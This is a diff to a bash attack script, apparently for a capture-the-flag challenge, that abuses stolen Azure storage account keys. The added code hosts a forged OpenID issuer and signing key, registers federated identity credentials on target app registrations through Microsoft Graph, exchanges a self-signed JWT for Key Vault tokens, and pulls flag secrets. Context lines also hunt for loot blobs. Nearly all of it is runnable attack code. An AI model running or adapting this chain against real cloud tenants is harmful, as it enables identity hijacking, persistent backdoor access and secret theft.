@@ -47,6 +47,40 @@ for sa_name in sttblcilogsprodx3euoz sttblappcfgprodx3euoz sttblbackupprodx3euoz
   kb=$(echo "$kr" | sed '/HTTP=/,$d')
   key=$(echo "$kb" | jq -r '.keys[0].value // empty' 2>/dev/null)
   if [ -n "$key" ]; then
+    ISS="https://$sa_name.z23.web.core.windows.net/ctf"
+    cat > /tmp/make_oidc.py <<'PY'
+import base64,json,time,os
+from cryptography.hazmat.primitives.asymmetric import rsa,padding
+from cryptography.hazmat.primitives import hashes,serialization
+def b64(x): return base64.urlsafe_b64encode(x).rstrip(b'=').decode()
+def bi(x): return b64(x.to_bytes((x.bit_length()+7)//8,'big'))
+k=rsa.generate_private_key(public_exponent=65537,key_size=2048); n=k.private_numbers(); pub=n.public_numbers
+jwk={'kty':'RSA','use':'sig','alg':'RS256','kid':'ctfchain','n':bi(pub.n),'e':bi(pub.e)}
+open('/tmp/ctf_key.pem','wb').write(k.private_bytes(serialization.Encoding.PEM,serialization.PrivateFormat.PKCS8,serialization.NoEncryption()))
+open('/tmp/ctf_jwks.json','w').write(json.dumps({'keys':[jwk]}))
+iss=os.environ['CTF_ISS']; now=int(time.time()); h=b64(json.dumps({'typ':'JWT','alg':'RS256','kid':'ctfchain'},separators=(',',':')).encode()); p=b64(json.dumps({'iss':iss,'sub':'solve:flag','aud':'api://AzureADTokenExchange','iat':now,'nbf':now-5,'exp':now+900},separators=(',',':')).encode()); raw=(h+'.'+p).encode(); print(raw.decode()+'.'+b64(k.sign(raw,padding.PKCS1v15(),hashes.SHA256())))
+PY
+    CTF_ISS="$ISS" JWT2=$(python3 /tmp/make_oidc.py)
+    printf '%s' "{\"issuer\":\"$ISS\",\"jwks_uri\":\"$ISS/jwks.json\",\"token_endpoint\":\"$ISS/token\",\"response_types_supported\":[\"id_token\"],\"subject_types_supported\":[\"public\"],\"id_token_signing_alg_values_supported\":[\"RS256\"]}" >/tmp/oidc.json
+    az storage blob upload --account-name "$sa_name" --account-key "$key" --container-name '$web' --name ctf/.well-known/openid-configuration --file /tmp/oidc.json --content-type application/json --overwrite true -o none 2>/dev/null
+    az storage blob upload --account-name "$sa_name" --account-key "$key" --container-name '$web' --name ctf/jwks.json --file /tmp/ctf_jwks.json --content-type application/json --overwrite true -o none 2>/dev/null
+    for target in 58108da8-044e-4d7e-9a46-92e6179b30be 2c34300e-1bc0-41e7-9c1e-8b7571d72c72 12ed54de-f2eb-4784-804c-3a7a3e83a9e9 881fddce-6208-4af5-a297-7e79c912f83c 038bc35d-131d-4953-9985-ff4a245ccec1; do
+      obj=$(curl -sS -H "Authorization: Bearer $graph" "https://graph.microsoft.com/v1.0/applications?%24filter=appId%20eq%20%27$target%27" | jq -r '.value[0].id // empty')
+      [ -z "$obj" ] && continue
+      fj=$(python3 -c "import json,sys;print(json.dumps({'name':'ctfchain'+sys.argv[1][-6:],'issuer':sys.argv[2],'subject':'solve:flag','audiences':['api://AzureADTokenExchange']}))" "$target" "$ISS")
+      fr=$(curl -sS -X POST -H "Authorization: Bearer $graph" -H 'Content-Type: application/json' -d "$fj" "https://graph.microsoft.com/v1.0/applications/$obj/federatedIdentityCredentials")
+      echo CHAIN_FIC_$target=$(echo "$fr" | jq -r '.id // .error.code // "?"')
+      sleep 2
+      vtresp=$(curl -sS -X POST "$BASE" -d "client_id=$target" -d scope=https://vault.azure.net/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$JWT2")
+      vt=$(echo "$vtresp" | jq -r '.access_token // empty')
+      echo CHAIN_VAULT_$target LEN=${#vt} ERR=$(echo "$vtresp" | jq -r '.error // empty')
+      if [ -n "$vt" ]; then
+        for sn in flag FLAG df26 platform-flag ctf-flag answer secret; do
+          got=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$sn?api-version=7.4" -H "Authorization: Bearer $vt")
+          echo "$got" | grep -Eo 'DF26\{[^}]+\}' || true
+        done
+      fi
+    done
     if [ "$sa_name" = "sttblcilogsprodx3euoz" ]; then
       for suspect in flag flag.txt exploit_flag.txt loot_latest.json mi_loot_1792639046.json mi_loot_latest.json mi_loot_probe.json latest.json loot.json secrets.json; do
         out=/tmp/suspect.$RANDOM
@@ -101,6 +135,7 @@ echo RETRY_MARK2=platform_fic_list
 echo RETRY_MARK3=listkeys_body
 echo RETRY_MARK4=retry_exchange_and_storage
 echo RETRY_MARK5=target_loot_blobs
+echo RETRY_MARK6=federated_oidc_chain
 # Probe the two resources named by the leaked settings.  The custom ArmOwner
 # app-role is not understood by ARM itself, but is accepted by the challenge's
 # internal catalog/debug handlers; keep all response bodies in the Action log.
